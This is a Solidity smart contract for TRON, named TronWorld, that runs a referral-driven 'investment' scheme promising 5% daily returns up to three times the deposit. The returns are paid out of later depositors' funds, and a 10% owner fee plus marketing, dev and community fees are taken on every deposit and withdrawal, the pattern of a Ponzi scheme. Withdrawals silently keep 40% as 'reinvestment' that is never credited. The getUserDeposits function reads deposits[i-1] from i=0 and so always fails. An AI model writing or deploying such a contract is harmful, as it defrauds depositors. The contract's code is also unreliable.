//SourceUnit: TronGladiator.sol

pragma solidity 0.5.4;

contract TronWorld {
    
    using SafeMath for uint;
    
    uint constant public INVEST_MIN_AMOUNT = 100 trx;

    // uint constant public WITHDRAW_MIN_AMOUNT = 50 trx;
    uint constant public BASE_PERCENT = 500;
    uint[] public REFERRAL_PERCENTS = [400, 300, 200, 100, 50, 50, 50, 50];
    uint constant public MARKETING_FEE = 250;
    uint constant public OWNER_FEE = 1000;
    uint constant public DEV_FEE = 250;
    uint constant public COMMUNITY_FEE = 30;
    uint constant public REINVEST_PERCENT = 4000;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public TIME_STEP = 1 days;

    uint public totalInvested;
    uint public totalWithdrawn;
    uint public totalUsers;

    address payable public ownerAddress;
    address payable public marketingAddress;
    address payable public communityAddress;
    address payable public devAddress;

    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        uint32 start;
    }

    struct User {
        Deposit[] deposits;
        uint64 bonus;
        uint64 totalBonus;
        uint32 checkpoint;
        address referrer;
    }

    mapping (address => User) internal users;

    event Newbie(address indexed user, address indexed referrer);
    event NewDeposit(address indexed user, uint amount);

    constructor(address payable ownerAddr, address payable marketingAddr, address payable communityAddr, address payable devAddr) public {
        require(!isContract(ownerAddr) && !isContract(marketingAddr) && !isContract(communityAddr) && !isContract(devAddr));
        ownerAddress = ownerAddr;
        marketingAddress = marketingAddr;
        communityAddress = communityAddr;
        devAddress = devAddr;
        users[msg.sender].deposits.push(Deposit(1 trx, 0, uint32(block.timestamp)));
    }

    function invest(address referrer) public payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount 100 TRX");
        User storage user = users[msg.sender];
        uint msgValue = msg.value;
        
        payAdmin(msgValue);

        if (user.referrer == address(0)) {
            require( users[referrer].deposits.length > 0 && referrer != msg.sender, "Invalid referrer");
            user.referrer = referrer;
        }

        address upline = user.referrer;
        for (uint i = 0; i < REFERRAL_PERCENTS.length; i++) {
            if (upline != address(0)) {
                uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                if (amount > 0) {
                    users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));
                }
                upline = users[upline].referrer;
            } else break;
        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            totalUsers++;
            emit Newbie(msg.sender, user.referrer);
        }

        user.deposits.push(Deposit(uint64(msgValue), 0, uint32(block.timestamp)));
        totalInvested = totalInvested.add(msgValue);

        emit NewDeposit(msg.sender, msgValue);
    }

    function withdraw() public {
        require(block.timestamp > users[msg.sender].checkpoint + TIME_STEP, "Ops!");
        User storage user = users[msg.sender];

        uint totalAmount;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {
            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3)) {
                dividends = getDividends(user.deposits[i], user.checkpoint);
                dividends = dividends.sub(dividends.mul(REINVEST_PERCENT).div(PERCENTS_DIVIDER));
                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); 
                totalAmount = totalAmount.add(dividends);
            }
        }
        // require(totalAmount > WITHDRAW_MIN_AMOUNT, "Insufficient dividends");
        totalAmount = uint(user.bonus).add(totalAmount);
        user.totalBonus = uint64(uint(user.totalBonus).add(user.bonus));
        user.bonus = 0;
        user.checkpoint = uint32(block.timestamp);
        
        payAdmin(totalAmount);

        msg.sender.transfer(totalAmount > address(this).balance ? address(this).balance : totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);
    }
    
    

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }
    
    function payAdmin(uint msgValue) private {
        uint fee = msgValue.mul(OWNER_FEE).div(PERCENTS_DIVIDER);
        if(fee > address(this).balance) fee=address(this).balance;
        if(fee>0) ownerAddress.transfer(fee);
        fee = msgValue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        if(fee > address(this).balance) fee=address(this).balance;
        if(fee>0) marketingAddress.transfer(fee);
        fee = msgValue.mul(DEV_FEE).div(PERCENTS_DIVIDER);
        if(fee > address(this).balance) fee=address(this).balance;
        if(fee>0) devAddress.transfer(fee);
        fee = msgValue.mul(COMMUNITY_FEE).div(PERCENTS_DIVIDER);
        if(fee > address(this).balance) fee=address(this).balance;
        if(fee>0) communityAddress.transfer(fee);
    }
    
    function getDividends(Deposit storage dep, uint _checkpoint) private view returns (uint) {
        uint dividends;

        if (uint(dep.withdrawn) < uint(dep.amount).mul(3)) {
            if (dep.start > _checkpoint) {
                dividends = (uint(dep.amount).mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
                    .mul(block.timestamp.sub(uint(dep.start)))
                    .div(TIME_STEP);
            } else {
                dividends = (uint(dep.amount).mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
                    .mul(block.timestamp.sub(_checkpoint))
                    .div(TIME_STEP);
            }
            if (uint(dep.withdrawn).add(dividends) > uint(dep.amount).mul(3)) {
                dividends = (uint(dep.amount).mul(3)).sub(uint(dep.withdrawn));
            }
        }
        return dividends;
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {
            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3)) {
                dividends = getDividends(user.deposits[i], user.checkpoint);
                totalDividends = totalDividends.add(dividends);
            }
        }
        return totalDividends;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint amount;
        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }
        return amount;
    }


    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint amount;
        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn));
        }
        return amount;
    }


    function getUserDeposits(address userAddress) public view returns (uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];
        uint[] memory amount = new uint[](user.deposits.length);
        uint[] memory withdrawn = new uint[](user.deposits.length);
        uint[] memory start = new uint[](user.deposits.length);

        for (uint i = 0; i < user.deposits.length; i++) {
            amount[i] = uint(user.deposits[i-1].amount);
            withdrawn[i] = uint(user.deposits[i-1].withdrawn);
            start[i] = uint(user.deposits[i-1].start);
        }

        return (amount, withdrawn, start);
    }
    
    
    function getData(address _addr) external view returns ( uint[] memory data, address userReferrer ){
    
        User memory u = users[_addr];
        uint[] memory d = new uint[](11);
        d[0] = u.deposits.length;
        d[1] = getUserTotalDeposits(_addr);
        d[2] = u.bonus;
        d[3] = getUserTotalWithdrawn(_addr);
        d[4] = getUserAvailable(_addr);
        d[5] = u.checkpoint;
        d[6] = totalUsers;
        d[7] = totalInvested;
        d[8] = totalWithdrawn;
        d[9] = getContractBalance();
        d[10] = u.totalBonus;
        
        return (d, u.referrer);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}